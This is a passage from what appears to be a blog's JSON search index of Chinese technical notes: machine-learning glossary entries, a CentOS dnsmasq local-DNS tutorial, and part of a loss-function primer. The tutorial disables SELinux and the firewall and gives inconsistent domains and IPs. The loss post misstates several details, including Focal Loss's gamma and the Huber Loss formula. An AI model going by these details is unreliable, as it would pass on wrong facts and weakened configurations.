是一种监督学习算法，主要用于分类和回归分析。它在解决小样本、非线性、高维数据的问题上表现出色，因此在机器学习领域得到了广泛的应用。</p>\n<h3 id=\"Perceptron（感知机）\"><a href=\"#Perceptron（感知机）\" class=\"headerlink\" title=\"Perceptron（感知机）\"></a>Perceptron（感知机）</h3><p>Perceptron 是最早的人工神经网络模型之一，由 Frank Rosenblatt 在 1957 年提出。它是一种简单的线性二分类模型，用于处理和分类数据。</p>\n<p>感知机由输入层、权重、偏置项和激活函数组成。输入层接收多个输入特征，每个特征都有一个对应的权重。输入特征和权重的点积加上偏置项构成了感知机的净输入。</p>\n<p>感知机可以看作是现代神经网络的一个特例，其中每个神经元只进行线性计算。现代神经网络通过堆叠多个感知机层（隐藏层）和引入非线性激活函数，能够解决更复杂的问题。</p>\n<h3 id=\"Kernel-Function（核函数）\"><a href=\"#Kernel-Function（核函数）\" class=\"headerlink\" title=\"Kernel Function（核函数）\"></a>Kernel Function（核函数）</h3><p>核函数（Kernel Function）是机器学习中的一种数学工具，主要目的是将数据映射到一个更高维的空间，以便在这个新空间中应用线性模型来解决原始空间中的非线性问题。</p>\n<p>常见的核函数有：线性核、多项式核、径向基函数核（Radial Basis Function Kernel，RBF，就是高斯核），Sigmod 核等。</p>\n<p>核函数是 SVM 处理非线性问题的关键技术，它允许 SVM 在高维特征空间中进行有效的线性分割，同时避免了直接在高维空间中进行计算的高成本。通过精心选择核函数和调整其参数，SVM 能够应用于各种复杂的数据集和问题。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://staff.ustc.edu.cn/~zhuang/cgi/lectures/cg5.pdf\">计算机图形学之几何变换</a></li>\n</ul>\n<h3 id=\"技术解读\"><a href=\"#技术解读\" class=\"headerlink\" title=\"技术解读\"></a>技术解读</h3><ul>\n<li><a href=\"https://blog.csdn.net/AIMZZY/article/details/106528350\">张量的概念及基本运算</a></li>\n<li><a href=\"https://www.cnblogs.com/young978/p/15678816.html\">PyTorch - Tensor的相关概念及操作</a></li>\n<li><a href=\"https://datawhalechina.github.io/thorough-pytorch/%E7%AC%AC%E4%BA%8C%E7%AB%A0/2.1%20%E5%BC%A0%E9%87%8F.html\">深入浅出Pytorch - 张量</a></li>\n<li><a href=\"https://www.jianshu.com/p/314b6cfce1c3\">PyTorch学习笔记(二)：Tensor操作</a></li>\n<li><a href=\"https://blog.51cto.com/u_11299290/3312822\">PyTorch基础 - 张量Tensor线性运算（点乘、叉乘）</a></li>\n<li><a href=\"https://blog.csdn.net/Dust_Evc/article/details/127502272\">点积、叉积、内积、外积</a></li>\n<li><a href=\"https://juejin.cn/post/7315122130287280138\">向量外积在图像纠错中的应用</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/346918533\">格拉斯曼: 扩展的学问与线之代数</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/2179484\">卷积公式</a></li>\n<li><a href=\"https://www.zdaiot.com/MachineLearning/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%8D%B7%E7%A7%AF%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8F%8A%E7%89%A9%E7%90%86%E6%84%8F%E4%B9%89%EF%BC%88%E5%85%A8%E9%9D%A2%E7%90%86%E8%A7%A3%E5%8D%B7%E7%A7%AF%EF%BC%89/\">卷积的本质及物理意义</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/196786958?utm_oi=1191492330161606656\">什么是卷积？</a></li>\n<li><a href=\"https://blog.sciencenet.cn/blog-548663-744441.html\">卷积与自由能</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/2127881\">很详细的讲解什么以及为什么是卷积</a></li>\n</ul>\n"},{"title":"基于DNSmasq构建本地DNS服务器","url":"/2020/07/05/%E5%9F%BA%E4%BA%8EDNSmasq%E6%9E%84%E5%BB%BA%E6%9C%AC%E5%9C%B0DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"<h2 id=\"本地网络规划方案\"><a href=\"#本地网络规划方案\" class=\"headerlink\" title=\"本地网络规划方案\"></a>本地网络规划方案</h2><p>为了解决KX上网的问题，经常需要修改DNS设置，干脆就在自己的局域网搭建一个本地DNS服务器，作为今后Linux系统安装的基础设施，一劳永逸解决问题。</p>\n<p>局域网Domain：  caogo.lan<br>DNS服务器：     192.168.0.144， dnsmasq, dnsmasq.caogo.lan</p>\n<p>原本想用BIND（named），虽然功能强大但是安装配置太复杂，研究发现局域网直接用DNSmasq最合适。<br>另外，局域网的Domain本来考虑<code>.local</code>，但发现Mac的Banjour服务默认使用了该域名后缀</p>\n<blockquote>\n<p>Bonjour服务是基于mDNS(Multicast DNS)协议实现的，mDNS协议适用于局域网内的设备通过组播的方式交互DNS记录来完成域名解析，约定的组播地址是：224.0.0.251，端口号是5353，mdns协议使用DNS协议一样的报文格式。详细资料见参考目录</p>\n</blockquote>\n<h2 id=\"DNSmasq概述\"><a href=\"#DNSmasq概述\" class=\"headerlink\" title=\"DNSmasq概述\"></a>DNSmasq概述</h2><p>DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能（本案不使用，核心AR路由器负责DHCP）。</p>\n<p>它服务那些只在本地适用的域名，这些域名是不会在全球的DNS服务器中出现的。DHCP服务器和DNS服务器结合，并且允许DHCP分配的地址能在DNS中正常解析，而这些DHCP分配的地址和相关命令可以配置到每台主机中，也可以配置到一台核心设备中（比如路由器），DNSmasq支持静态和动态两种DHCP配置方式。</p>\n<h2 id=\"DNS服务器的配置步骤\"><a href=\"#DNS服务器的配置步骤\" class=\"headerlink\" title=\"DNS服务器的配置步骤\"></a>DNS服务器的配置步骤</h2><ol>\n<li><p>安装操作系统后，找到网卡参数文件并设置静态IP地址130（必须的），至少包含以下参数：BOOTPROTO、ONBOOT、IPADDR、NETMASK、GATEWAY。<br>然后，激活该网络配置<code>systemctl restart network</code>并确认成功联网。</p>\n</li>\n<li><p>刚装好的Centos必须马上关闭firewalld，否则后面虽然netestat显示53端口开放，但是外网死活就访问不了<br>为了后续yum安装访问Internet，临时设置域名服务器安装必要的基础网络工具。</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 赶紧关闭防火墙</span></span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/sysconfig/selinux</span><br><span class=\"line\">setenforce 0</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> firewalld</span><br><span class=\"line\">systemctl stop firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为安装工具软件，临时设置DNS</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/resolv.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">nameserver 8.8.8.8</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">yum install dnsmasq net-tools bind-utils yum-utils tree -y</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>定义DNSmasq核心配置文件<code>/etc/dnsmasq.conf</code></p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mv</span> /etc/dnsmasq.conf /etc/dnsmasq.conf.orig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/dnsmasq.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">listen-address=127.0.0.1, 192.168.0.144</span></span><br><span class=\"line\"><span class=\"string\">expand-hosts</span></span><br><span class=\"line\"><span class=\"string\">domain=caogo.local</span></span><br><span class=\"line\"><span class=\"string\">server=8.8.8.8</span></span><br><span class=\"line\"><span class=\"string\">server=114.114.114.114</span></span><br><span class=\"line\"><span class=\"string\">address=/caogo.local/127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">address=/caogo.local/192.168.0.144</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>导入本地域名解析文件<code>/etc/hosts</code>，先定义这些hosts，以后要增加就编辑这个文件</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt;&gt; /etc/hosts &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">127.0.0.1       dnsmasq</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.1     gateway</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.5     ap</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.8     proxy</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.11    plc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.132   pve01 pve</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.120   nfs</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.140   ntp</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.144   dnsmasq dns ns01 ns02</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.148   mirror yum</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">192.168.0.210   master1</span></span><br><span class=\"line\"><span class=\"string\">192.168.0.212   worker1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：在PVE虚拟机中，Cloud-init启动会修改<code>/etc/hosts</code>，解决办法是修改 <code>/etc/cloud/cloud.cfg</code>，注释其中的<code>update_etc_hosts</code>字段</p>\n</blockquote>\n</li>\n<li><p>最关键的一步：编辑域名解析核心配置文件<code>/etc/resolv.conf</code></p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/resolv.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># set localhost as the unique namserver</span></span><br><span class=\"line\"><span class=\"string\">nameserver  127.0.0.1</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置运行环境等</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 禁止修改配置文件，以防止NetworkManger等默默修改域名解析配置</span></span><br><span class=\"line\">chattr +i /etc/resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置开机自启动</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> dnsmasq</span><br><span class=\"line\">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>确认DNS解析服务运行正常</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># netstat -tunpl |grep 53</span></span><br><span class=\"line\">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      9863/dnsmasq</span><br><span class=\"line\">tcp6       0      0 :::53                   :::*                    LISTEN      9863/dnsmasq</span><br><span class=\"line\">udp        0      0 0.0.0.0:53              0.0.0.0:*                           9863/dnsmasq</span><br><span class=\"line\">udp6       0      0 :::53                   :::*                                9863/dnsmasq  </span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"如何使用DNS公共服务\"><a href=\"#如何使用DNS公共服务\" class=\"headerlink\" title=\"如何使用DNS公共服务\"></a>如何使用DNS公共服务</h2><p>在局域网中，为每台服务器的<code>/etc/resolv.conf</code>中设置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># domain caogo.local</span><br><span class=\"line\">nameserver 192.168.0.144</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在创建虚拟机时，cloudinit 将通过 DHCP 获取网络配置，从而修改 &#x2F;etc&#x2F;resolv.conf 文件，为此建议模版中将该文件设置为不可修改，方法是 <code>chattr +i /etc/resolv.conf</code></p>\n</blockquote>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://wiki.archlinux.org/index.php/Dnsmasq#DNS_addresses_file_and_forwarding\">Dnsmasq的官方网站</a></li>\n<li><a href=\"https://www.howtoing.com/setup-a-dns-dhcp-server-using-dnsmasq-on-centos-rhel\">Dnsmasq配置的核心参考文档</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1174717\">DNSmasq详细解析及详细配置-腾讯云</a></li>\n<li><a href=\"https://www.kclouder.cn/centos-7-dns-bind/\">CentOS 7 安装配置本地DNS (BIND) 服务器（Master-Slave）</a></li>\n<li><a href=\"https://wiki.archlinux.org/index.php/BIND\">BIND的官方网站</a></li>\n<li><a href=\"https://blog.csdn.net/yueqian_scut/article/details/52694411\">局域网设备发现之Bonjour协议</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Multicast_DNS\">RFC-6762</a></li>\n</ul>\n"},{"title":"大模型学习笔记之三：损失函数","url":"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/","content":"<p>在机器学习中，损失函数是代价函数的一部分，而代价函数则是目标函数的一种类型。</p>\n<ul>\n<li>损失函数（Loss function）：用于定义<strong>单个训练样本</strong>与真实值之间的误差；</li>\n<li>代价函数（Cost function）：用于定义<strong>单个批次</strong>，或整个训练集样本与真实值之间的误差；</li>\n<li>目标函数（Objective function）：泛指任意可以被优化的函数。</li>\n</ul>\n<p>损失函数是用于衡量模型所作出的预测离真实值（Ground Truth）之间的偏离程度。</p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>在深度学习广为使用的今天，我们可以在脑海里清晰的知道，一个模型想要达到很好的效果需要学习（&#x3D;训练）。一个好的训练离不开优质的负反馈，损失函数（Loss Functions）就是模型的负反馈。简化地说，损失函数可以定义为具有两个参数的函数：一是预测输出（Predicted Output），二是实际输出（True Output）。</p>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/demo.png\" alt=\"Group\"></p>\n<p>对于样本空间 $X$ 的某个训练样本 $x$，人脑中有一个真实的概率分布模型，其输出就是正确答案 $y$，而神经网络就是基于内置参数 $(w,b)$ 计算预测的另一个概率分布模型，其输出 Y_pred 就是$f(x)$，所谓<strong>损失函数就是比较真实分布和预测分布之间的差距</strong>。若损失函数很小，表明机器学习模型与数据真实分布很接近，则模型性能良好；若损失函数很大，表明机器学习模型与数据真实分布差别较大，则模型性能不佳。</p>\n<p>损失函数大致可分为两种，一是分类问题，其目标是预测一个离散的标签（判断题），例如垃圾邮件检测、疾病诊断等；二是回归问题，其目标是预测一个连续的数值（填空题），例如房价预测、气温预测等。主要区别是：</p>\n<ul>\n<li>问题类型：回归问题面向连续性变量，分类问题面向离散型变量</li>\n<li>误差度量：回归问题关注预测值与实际值之间的差异，表示为 $y-f(x)$，也称为“<strong>残差（Residual）</strong>”；而分类问题关注的是预测类别是否正确，表示为 $yf(x)$，也称为“<strong>边界（Margin）</strong>”</li>\n<li>优化目标：回归模型优化的是预测值与实际值之间的连续误差，分类模型优化的是预测类别的准确性</li>\n</ul>\n<p>俗话说，任何事情必然有它的两面性，因此，并没有一种万能的损失函数能够适用于所有的机器学习任务，所以在这里我们需要知道每一种损失函数的优点和局限性，才能更好的利用它们去解决实际的问题。</p>\n<h2 id=\"二、面向分类的损失函数\"><a href=\"#二、面向分类的损失函数\" class=\"headerlink\" title=\"二、面向分类的损失函数\"></a>二、面向分类的损失函数</h2><p>对于二分类问题，定义 $y \\in \\{ −1,+1 \\} $，损失函数最直观的思路就是<strong>0-1损失（zero-one loss）</strong>，数学表达为：<br>$$ L(y,f(x)) &#x3D;  \\begin {cases}<br>                        0,&amp;  yf(x) \\geq 0 \\\\<br>                        1,&amp;  yf(x) &lt; 0<br>                \\end{cases}<br>$$</p>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/loss01.png\" alt=\"0-1\"></p>\n<p>0-1损失函数存在两个明显的问题，一是对每个错误的分类点都施以相同的惩罚（取值1），这样那些“错的离谱“ (即 $yf(x) 是一个很大的负数)的样本并没有接受较大的惩罚，这在直觉上不是很合适；二是函数不连续、非凸的特点导致计算不方便，因而我们通常使用其他的代理损失函数进行优化。</p>\n<h3 id=\"1-Cross-Entropy-Loss（交叉熵损失函数）-Logistic-Loss（对数损失函数）\"><a href=\"#1-Cross-Entropy-Loss（交叉熵损失函数）-Logistic-Loss（对数损失函数）\" class=\"headerlink\" title=\"1. Cross Entropy Loss（交叉熵损失函数）&#x3D; Logistic Loss（对数损失函数）\"></a>1. Cross Entropy Loss（交叉熵损失函数）&#x3D; Logistic Loss（对数损失函数）</h3><p>物理学上的熵表示一个热力学系统的无序程度。为了解决对信息的量化度量问题，香农在 1948年 提出了“信息熵”的概念，使用对数函数表示对不确定性的测量。熵越高，表示能传输的信息越多，熵越少，表示传输的信息越少，可以直接将熵理解为信息量。交叉熵（cross-entropy，CE）刻画了两个概率分布之间的距离，更适合用在分类问题上，因为交叉熵表达预测输入样本属于某一类的概率。</p>\n<p>可以证明，<strong>交叉熵,KL散度,极大似然估计这几种求解模型参数的方法，最终的结果都是等价的</strong>，由于交叉熵形式比较接近最终损失函数形式，人们默认交叉熵就是 softmax 分类器的损失函数。<br>但是要注意，<strong>这三者等价的前提是：标签只有一类是正确分类（即 one-hot）</strong>，这符合分类问题的定义。但如果你考虑的问题不是分类问题，或者标签是非平凡的（并不只有一类为1，其它全为0）,再使用交叉熵就不合理了。</p>\n<h4 id=\"二分类\"><a href=\"#二分类\" class=\"headerlink\" title=\"二分类\"></a>二分类</h4><p>对于给定输入的样本 $x_i$，人脑的真实分布输出（即标签）为 $y_i$，取值为 $y_i \\in \\{0,1\\}$（集合，非0即1），而预测模型的输出 $f(x_i)$ 记为 $\\hat{y_i}$，通常使用 Sigmoid 函数压缩为 $\\hat{y_i} \\in [ 0,1 ]$ （闭区间，从0到1的所有实数）。</p>\n<p>假设单个观测的数据遵循伯努利分布（扩展到固定数量的独立观测，就是二项分布）。根据伯努利分布（Bernoulli distribution，也称两点分布或者0-1分布），记其成功概率为 $p(0 \\leqslant p \\leqslant 1)$，失败概率为 $q&#x3D;1-p$，其概率密度函数为：<br>$$ f(x)&#x3D;p^x(1-p)^{(1-x)} &#x3D;<br>\\begin{cases}<br>    p, &amp;  x &#x3D; 1 \\\\<br>    1-p, &amp;  x &#x3D;0<br>\\end{cases}<br>$$</p>\n<p>则有：<br>$$p(y_i|x_i) &#x3D; (\\hat{y_i}^{y_i})(1-\\hat{y_i})^{1-y_i}$$</p>\n<p>假设数据点之间独立同分布，则似然值可以表示为<br>$$L(x,y) &#x3D; \\prod_{i&#x3D;1}^{n} (\\hat{y_i}^{y_i})(1-\\hat{y_i})^{1-y_i} $$</p>\n<p>对似然值取对数，然后加负号变成最小化负对数似然值，即为交叉熵损失函数的形式：<br>$$Loss(y_i,\\hat{y_i}) &#x3D; - \\sum_{i&#x3D;1}^{n} (({y_i} \\log \\hat{y_i}) + (1-y_i) \\log (1-\\hat{y_i})) $$</p>\n<p>对公式的解释如下：</p>\n<ul>\n<li>当 $y_i&#x3D;1$（样本标签为正类）时，损失函数为 $- \\log \\hat{y_i}$，损失与模型预测为正类的概率的对数成正比</li>\n<li>当 $y_i&#x3D;0$（样本标签为负类）时，损失函数为 $- \\log (1-\\hat{y_i})$，损失与模型预测为负类的概率的对数成正比</li>\n</ul>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/CE-2.png\" alt=\"CE-2\"></p>\n<h4 id=\"多分类\"><a href=\"#多分类\" class=\"headerlink\" title=\"多分类\"></a>多分类</h4><p>以二分类问题为基础，扩展到多分类问题，则有：</p>\n<p>假设有 $C$ 个类别，每个样本 $x_i$ 的实际标签为 $y_i$ ，其中 $y_i$ 是一个独热编码的向量，表示类别的索引。模型预测每个类别的概率分布为 $\\hat{y_i}$，其中 表示 $\\hat{y_{i,c}}$ 样本属于类别 $c$ 的预测概率。</p>\n<p>交叉熵损失函数的数学定义为：<br>$$Loss(y_i,\\hat{y_i}) &#x3D; - \\sum_{i&#x3D;1}^{n} \\sum_{c&#x3D;1}^{C} y_{i,c} \\log{\\hat{y_{i,c}}}$$</p>\n<p>其中：</p>\n<ul>\n<li>$y$ 是实际标签的集合</li>\n<li>$\\hat y$ 是模型预测的概率分布</li>\n<li>$n$ 是样本数量</li>\n<li>$C$ 是类别数量</li>\n<li>$y_{i,c}$ 是独热编码的实际标签，如果样本 $x_i$ 属于类别 $c$ 则 $y_{i,c}$&#x3D;1，否则 $y_{i,c}$&#x3D;0</li>\n<li>$\\hat{y_{i,c}}$ 是模型预测样本 $x_i$ 属于类别 $c$ 的概率。</li>\n</ul>\n<p>总结一下，交叉熵 Loss 的优点是在整个实数域内，Loss 近似线性变化。尤其是当 margin &lt;&lt; 0 的时候，Loss 更近似线性。这样，模型受异常点的干扰就较小。 而且，交叉熵 Loss 连续可导，便于求导计算，是使用最广泛的损失函数之一。</p>\n<h3 id=\"2-Focal-Loss（焦点损失函数）\"><a href=\"#2-Focal-Loss（焦点损失函数）\" class=\"headerlink\" title=\"2. Focal Loss（焦点损失函数）\"></a>2. Focal Loss（焦点损失函数）</h3><p>Focal loss 损失函数是为了解决 one-stage 目标检测中<strong>正负样本极度不平衡</strong>的问题，是一个密集目标检测的损失函数。在训练深层神经网络解决目标检测和分类问题时，这是最常见的选择之一。</p>\n<p>焦点损失，出自何凯明的<a href=\"https://arxiv.org/pdf/1708.02002\">Focal Loss for Dense Object Detection</a>，出发点是解决目标检测领域中 one-stage 算法（如 YOLO 系列算法）准确率不高的问题。作者认为样本的类别不均衡（比如前景和背景）是导致这个问题的主要原因。比如在很多输入图片中，我们利用网格去划分小窗口，大多数的窗口是不包含目标的。如此一来，如果我们直接运用原始的交叉熵损失，那么负样本所占比例会非常大，主导梯度的优化方向，即网络会偏向于将前景预测为背景。即使我们可以使用 OHEM（在线困难样本挖掘）算法来处理不均衡的问题，虽然其增加了误分类样本的权重，但也容易忽略掉易分类样本。而 Focal loss 则是聚焦于训练一个困难样本的稀疏集，通过直接在标准的交叉熵损失基础上做改进，引进了两个惩罚因子，来减少易分类样本的权重，使得模型在训练过程中更专注于困难样本。</p>\n<p>Focal Loss 的数学公式为：<br>$$ FL &#x3D; -\\alpha_t(1-\\hat{p_t})^\\gamma \\log(\\hat{p_t})$$</p>\n<p>其基本定义如下：</p>\n<ul>\n<li>$\\hat{p_t}$ 是模型对于每个类别 $t$ 的预测概率</li>\n<li>$y_t$ 是实际的标签，如果样本属于类别 $t$，则 $y_t&#x3D;1$，否则 $y_t&#x3D;0$</li>\n<li>$\\alpha_t$ 是一个平衡正负样本的权重因子，通常对于正样本设置为 1，对于负样本可以设置为一个较小的值。</li>\n<li>$\\gamma$ 是一个调节因子（focal系数），用于减少对易分类样本的关注，通常设置为 2 或 5</li>\n<li>当 $\\hat{p_t}$ 接近 1（对于正样本）或 0（对于负样本）时，$(1-\\hat{p_t})^\\gamma$ 项会接近 0，以减少这些样本的损失贡献</li>\n</ul>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/focal.png\" alt=\"focus\"></p>\n<p>实验中，作者取（$\\alpha_t$&#x3D;0.25，$\\gamma$&#x3D;0.2）的效果最好，具体还需要根据任务的情况调整。由此可见，应用 Focal-loss 也会额外引入两个超参数，需要丰富的经验才能调好。</p>\n<h3 id=\"3-Exponential-Loss（指数损失函数）\"><a href=\"#3-Exponential-Loss（指数损失函数）\" class=\"headerlink\" title=\"3. Exponential Loss（指数损失函数）\"></a>3. Exponential Loss（指数损失函数）</h3><p>Exponential Loss，又称指数损失，其表达式如下：<br>$$Loss(y,f(x)) &#x3D; e^{-yf(x)}$$</p>\n<p>Exponential Loss 与交叉熵损失函数类似，但它是指数下降的，因此梯度较其它损失函数更大一些。<br><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/exp-loss.png\" alt=\"exp\"></p>\n<p>Exponential Loss 是 AdaBoost 中使用的损失函数，可以比较方便地利用加法模型推导出 AdaBoost 算法。然而其和Squared Loss 一样，对异常点较为敏感，鲁棒性不够。</p>\n<h3 id=\"4-Hinge-Loss（合页损失函数）\"><a href=\"#4-Hinge-Loss（合页损失函数）\" class=\"headerlink\" title=\"4. Hinge Loss（合页损失函数）\"></a>4. Hinge Loss（合页损失函数）</h3><p>Hinge loss 损失函数通常适用于二分类的场景中，可以用来解决间隔最大化的问题。数学表达为：<br>$$ Loss(y,f(x)) &#x3D; max(0, 1-yf(x))$$</p>\n<p>Hinge 损失函数将与分类边界之间的差值或距离纳入成本计算。即使新的观察结果被正确分类，如果决策边界的差距不够大，它们也会受到惩罚，损失呈线性增加。<br><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/hinge.png\" alt=\"hinge\"></p>\n<p>Hinge Loss 的形状就像一本要合上的书，故称为合页损失。显然，只有当 ys &lt; 1 时，Loss 才大于零；对于 ys &gt; 1 的情况，Loss 始终为零。Hinge Loss 一般多用于支持向量机（SVM）中，体现了 SVM 距离最大化的思想。而且，当 Loss 大于零时，是线性函数，便于梯度下降算法求导。<br>Hinge Loss 的另一个优点是使得 ys &gt; 0 的样本损失皆为 0，由此带来了稀疏解，使得 SVM 仅通过少量的支持向量就能确定最终超平面。</p>\n<h3 id=\"5-Huber-Loss（Huber损失函数）\"><a href=\"#5-Huber-Loss（Huber损失函数）\" class=\"headerlink\" title=\"5. Huber Loss（Huber损失函数）\"></a>5. Huber Loss（Huber损失函数）</h3><p>Huber Loss 结合了均方损失（MSE）和绝对值损失（MAE）的优点，当 $|y-f(x)|$ 小于一个指定的 $\\delta$（&#x3D;-1） 时，变为平方损失，大于 $\\delta$（&#x3D;-1）时变为绝对值损失，因此比前两者更有鲁棒性。数学表达是：<br>$$Loss(y,f(x)) &#x3D;<br>    \\begin{cases}<br>        0，                 &amp; yf(x) \\geqslant 1 \\\\<br>        (1-yf(x))^2,        &amp; 0 &gt; yf(x) \\geqslant -1 \\\\<br>        -4yf(x),            &amp; yf(x) &lt; -1<br>    \\end{cases}<br>$$</p>\n<p>从表达式和 Loss 图形上看，Huber Loss 结合了 Hinge Loss 和 交叉熵 Loss 的优点。一方面能在 ys &gt; 1 时产生稀疏解提高训练效率；另一方面对于 ys &lt; −1 样本的惩罚以线性增加，这意味着受异常点的干扰较少。</p>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/huber-class.png\" alt=\"huber\"></p>\n<blockquote>\n<p>Huber Loss 既可以用于回归问题，也能应用于分类问题中.</p>\n</blockquote>\n<h2 id=\"三、面向回归的损失函数\"><a href=\"#三、面向回归的损失函数\" class=\"headerlink\" title=\"三、面向回归的损失函数\"></a>三、面向回归的损失函数</h2><p>回归问题中 y 和 f(x) 都是实数，因此直接使用<strong>残差</strong>（ $y−f(x)$）来度量二者的不一致程度。残差 (的绝对值) 越大，则损失函数越大，学习出来的模型效果就越差（这里不考虑正则化问题）。</p>\n<h3 id=\"1-MAE（Mean-Averange-Error，平均绝对误差）\"><a href=\"#1-MAE（Mean-Averange-Error，平均绝对误差）\" class=\"headerlink\" title=\"1. MAE（Mean Averange Error，平均绝对误差）\"></a>1. MAE（Mean Averange Error，平均绝对误差）</h3><p>平均绝对误差（MAE）是另一种常用的回归损失函数，它是目标值与预测值之差绝对值和的均值，表示了预测值的平均误差幅度，而不需要考虑误差的方向，也称为 <strong>L1 Loss 损失函数</strong>（注：平均偏差误差 MBE 则是考虑的方向的误差，是残差的和），范围是 0 到 $\\infty$，其公式如下所示：<br>$$ MAE &#x3D; \\frac{1}{N} \\sum_{i&#x3D;1}^{N} \\vert y_i-f(x_i) \\vert $$</p>\n<h3 